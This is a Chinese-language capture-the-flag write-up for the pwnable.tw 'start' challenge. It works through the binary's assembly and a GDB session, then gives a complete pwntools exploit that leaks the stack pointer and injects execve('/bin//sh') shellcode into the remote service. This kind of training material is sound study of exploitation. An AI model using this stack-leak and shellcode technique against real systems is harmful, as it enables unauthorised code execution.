---
title: "pwnable.tw start — 手刻 stack leak + ret2shellcode"
date: "2026-07-19"
category: "PWN"
tags: ["pwn", "pwnable.tw", "ret2shellcode", "stack-leak", "x86"]
summary: "pwnable.tw 的第一題 start。從讀 32-bit syscall、找 offset，到踩進「用 GDB 位址硬寫」的坑，最後用 push %esp 洩漏 stack、在同一個 process 內二次輸入完成 ret2shellcode。"
---

## 閱讀過程

### binary 資訊

```text
<打碼>$ file start
start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
<打碼>$ checksec --file=start
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY   Fortified   Fortifiable      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8 Symbols         No      0           0start
<打碼>$ objdump -d start
start:     file format elf32-i386
Disassembly of section .text:

08048060 <_start>:
 8048060:       54                      push   %esp
 8048061:       68 9d 80 04 08          push   $0x804809d
 8048066:       31 c0                   xor    %eax,%eax
 8048068:       31 db                   xor    %ebx,%ebx
 804806a:       31 c9                   xor    %ecx,%ecx
 804806c:       31 d2                   xor    %edx,%edx
 804806e:       68 43 54 46 3a          push   $0x3a465443
 8048073:       68 74 68 65 20          push   $0x20656874
 8048078:       68 61 72 74 20          push   $0x20747261
 804807d:       68 73 20 73 74          push   $0x74732073
 8048082:       68 4c 65 74 27          push   $0x2774654c
 8048087:       89 e1                   mov    %esp,%ecx
 8048089:       b2 14                   mov    $0x14,%dl
 804808b:       b3 01                   mov    $0x1,%bl
 804808d:       b0 04                   mov    $0x4,%al
 804808f:       cd 80                   int    $0x80
 8048091:       31 db                   xor    %ebx,%ebx
 8048093:       b2 3c                   mov    $0x3c,%dl
 8048095:       b0 03                   mov    $0x3,%al
 8048097:       cd 80                   int    $0x80
 8048099:       83 c4 14                add    $0x14,%esp
 804809c:       c3                      ret

0804809d <_exit>:
 804809d:       5c                      pop    %esp
 804809e:       31 c0                   xor    %eax,%eax
 80480a0:       40                      inc    %eax
 80480a1:       cd 80                   int    $0x80
```

### 讀 ASM

這個對我來說是一個非常陌生的語法，以前都是看 x86-64 的，這種幾乎沒看過
我去讀了一下這種 32bits 的呼叫語法，然後我去讀了他的原理是什麼
這題的重點是在 `<_start>`

我逐段解析

#### 第一段

```asm
 8048060:       54                      push   %esp      
 8048061:       68 9d 80 04 08          push   $0x804809d
 8048066:       31 c0                   xor    %eax,%eax
 8048068:       31 db                   xor    %ebx,%ebx
 804806a:       31 c9                   xor    %ecx,%ecx
 804806c:       31 d2                   xor    %edx,%edx
```

這邊是將 ESP 和 0x804809d push 進去 Stack ，然後把 EAX, EBX, ECX, EDX 給清空

<small>註： ESP 是 Extended Stack Pointer 指向 Stack 的頂端，然後如果後面 push 任何數值或是寄存器(這裡拿 EAX 舉例)進去 stack 的話會執行 EAX = ESP, ESP = ESP + 4</small>

#### 第二段

```asm
 804806e:       68 43 54 46 3a          push   $0x3a465443
 8048073:       68 74 68 65 20          push   $0x20656874
 8048078:       68 61 72 74 20          push   $0x20747261
 804807d:       68 73 20 73 74          push   $0x74732073
 8048082:       68 4c 65 74 27          push   $0x2774654c
 8048087:       89 e1                   mov    %esp,%ecx
 8048089:       b2 14                   mov    $0x14,%dl
 804808b:       b3 01                   mov    $0x1,%bl
 804808d:       b0 04                   mov    $0x4,%al
 804808f:       cd 80                   int    $0x80
```

這裡先把一段 Byte 給 Push 進去了，然後後面進行一些參數設置
首先是先將 ECX ( Function 的第四個參數) 賦值為 ESP (Stack Top)
然後是 dl, bl, al 的賦值
DL 是 Function Call 的第三個參數
BL 是本地變數
AL 是 Return value
然後 int $80 是觸發 System Call 的意思
然後他會抓我的 RAX (在這邊是 AL )
呼叫協議在這裡補充一下好了：

```text
eax = 1    exit(status)
eax = 3    read(fd, buf, count)
eax = 4    write(fd, buf, count)
eax = 5    open(path, flags, mode)
eax = 6    close(fd)
eax = 11   execve(path, argv, envp)
eax = 125  mprotect(addr, len, prot)
eax = 192  mmap2(...)
```

al = 4 -> 呼叫 Write -> 抓取 BL, ECX, DL 去當做 123 的參數 -> 翻譯成 C是：

```c
write(1, esp, 20);
```

意思就是他會從 esp 開始抓出 20B Print 出來
他會 print 這個出來：

```text
Let's start the CTF:
```

#### 第三段

```asm
 8048091:       31 db                   xor    %ebx,%ebx
 8048093:       b2 3c                   mov    $0x3c,%dl
 8048095:       b0 03                   mov    $0x3,%al
 8048097:       cd 80                   int    $0x80
 8048099:       83 c4 14                add    $0x14,%esp
 804809c:       c3                      ret
```

這邊和上面一樣是 syscall
然後這邊翻譯成 C 是：

```c
read(0, esp, 60)
```

所以我的輸入會被存到現在的 ecx (Stack Top) 的位置，然後這邊的 esp 在輸入過後 add $0x14  

#### 結論

結合沒有 PIE 、沒有 NX 、沒有 Canary 的資訊
我的目標現在挺清楚的，我要可以直接寫 Shell Code 然後 Ret2shellcode

## 寫 exp

我現在想要來接著我上面的觀察結論開始寫 exp.py 了
統整一些關鍵信息：

```text
offset = 0x14 + 0x4
```

然後我通過 gdb 抓他的 eip 位置在哪裡

```text
(gdb) disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   %esp
   0x08048061 <+1>:     push   $0x804809d
   0x08048066 <+6>:     xor    %eax,%eax
   0x08048068 <+8>:     xor    %ebx,%ebx
   0x0804806a <+10>:    xor    %ecx,%ecx
   0x0804806c <+12>:    xor    %edx,%edx
   0x0804806e <+14>:    push   $0x3a465443
   0x08048073 <+19>:    push   $0x20656874
   0x08048078 <+24>:    push   $0x20747261
   0x0804807d <+29>:    push   $0x74732073
   0x08048082 <+34>:    push   $0x2774654c
   0x08048087 <+39>:    mov    %esp,%ecx
   0x08048089 <+41>:    mov    $0x14,%dl
   0x0804808b <+43>:    mov    $0x1,%bl
   0x0804808d <+45>:    mov    $0x4,%al
   0x0804808f <+47>:    int    $0x80
   0x08048091 <+49>:    xor    %ebx,%ebx
   0x08048093 <+51>:    mov    $0x3c,%dl
   0x08048095 <+53>:    mov    $0x3,%al
   0x08048097 <+55>:    int    $0x80
   0x08048099 <+57>:    add    $0x14,%esp
   0x0804809c <+60>:    ret
End of assembler dump.
(gdb) b *0x0804809c
Breakpoint 1 at 0x804809c
(gdb) run
Starting program: <打碼>
Let's start the CTF:AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90CCCC

Breakpoint 1, 0x0804809c in _start ()
(gdb) x/40wx $esp
0xffffca58:     0x42424242      0x3039785c      0x3039785c      0x3039785c
0xffffca68:     0x3039785c      0x43434343      0xffffcc0a      0xffffcc5b
0xffffca78:     0xffffcc72      0xffffcc87      0xffffccd9      0xffffcce7
0xffffca88:     0xffffcd10      0xffffcd1f      0xffffcd28      0xffffcd39
0xffffca98:     0xffffcd46      0xffffcd69      0xffffd44d      0xffffd459
0xffffcaa8:     0xffffd484      0xffffd49e      0xffffd4c0      0xffffd4d7
0xffffcab8:     0xffffd4eb      0xffffd50b      0xffffd516      0xffffd521
0xffffcac8:     0xffffd529      0xffffd544      0xffffd564      0xffffd593
0xffffcad8:     0xffffd59b      0xffffd5dc      0xffffdee7      0xffffdf1d
0xffffcae8:     0xffffdf2d      0xffffdf55      0x00000000      0x00000020
```

我現在知道我的 EIP 在哪個地方了

```text
padding = 20 * b'A'
addr = 0xffffca58
```

好，有這兩個就够了，我現在要來寫 Shellcode 了

```text
sc = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f 
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80
""")
```

和大家介紹一下這個是什麼意思 我在這裡寫了一段 shell Code
這段 Shell Code 是在構建這一句 C

```c
execve("/bin//sh", ["/bin//sh", NULL], NULL);
```

那依照我前面給的小抄的得出我要做到以下幾點
EAX = 11 (0xb)
EBX = "/bin//sh"
ECX = ["/bin//sh", NULL]
EDX = NULL
那我在上面先把 EAX 變成 0
然後為什麼要在第二行 Push EAX 呢？
因為這裡是 String 的 Null Byte
然後我為什麼要把我的 EBX 賦值成 /bin//sh 呢？
因為怕 Shell Code 包含 Null Byte 會爆炸
那為什麼在第六行加入 Null Byte 呢？
因為 Array 也需要 Null Byte 當做結尾

那我的 Payload 就完成啦

```python
padding = 20 * b'A'
addr = 0xffffca58
sc = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f 
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80
""")
payload = padding + addr + sc
```

不對，我這邊失敗了

## 痛苦的調試

在經過我們 Codex 老師孜孜不倦的誤導之下我選擇了退訂 Codex 擁抱 CC
然後在半個小時的認知矯正之後確定了以下重點：

1. Stack 在每一個環境執行的 Addr 是不穩定的，所以用 GDB 抓到的不一定就可以直接用，更別說是 Remote 了
2. ESP 指向的是 StackTop 不是 StackBase ，但是在 ret 的時候， eip = mem[esp] ，所以最後的 add esp 0x14 就是我的 Offset
3. 我可以通過將第一次的 ret 地址設置成 0x08048087，那他就會將我現在的 Stack 從 ESP 開始的 20B leak出來，又因為 ASM 最前面的 push $esp 一直在存在 Stack 的最底部，然後我前面的東西完全沒有覆蓋到他，所以當我 ret 的時候他當他執行了 esp+4 的動作時，esp 剛剛好就會落在 我前面 push $esp 的位置
4. 我們得到了 ESP 在這個程式啟動時最初始的位置，我們就可以做到推斷他 Round 2 最後的 add esp, 0x14 的位置並且精準覆蓋了

非常好，我們用這個原理去做了一個攻擊鏈，接下來就是寫第二次 exp.py 了：

```python
from pwn import *

# p = process("./start")
p = remote("chall.pwnable.tw", 10000)
#Stage1 Use Write to leak the stack
padding = 20 * b"A"
write_addr = p32(0x08048087)
payload = padding + write_addr
p.recvuntil(b"CTF:")
p.send(payload)
raw_leak = p.recvn(20)
leaked_esp = u32(raw_leak[:4])
log.info(f'leak : {hex(leaked_esp)}')

# Stage2 Use the leaked ESP addr to make payload

sc = asm(
    """
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80
    """
)
'''
SC in python like decomplied is:
eax = NULL
stack.push(eax)
stack.push("/bin//sh")
ebx = stack.top()
stack.push(eax)
stack.push(ebx)
ecx = stack.top()
edx = NULL
eax.low8bits = 0xb
syscall()
'''
payload2 = padding + p32(leaked_esp + 0x14) + sc
p.send(payload2)
p.interactive()
```

這次終於成功了，然後 flag 在 `/home/start` 裡面

```text
FLAG{<打碼>}
```
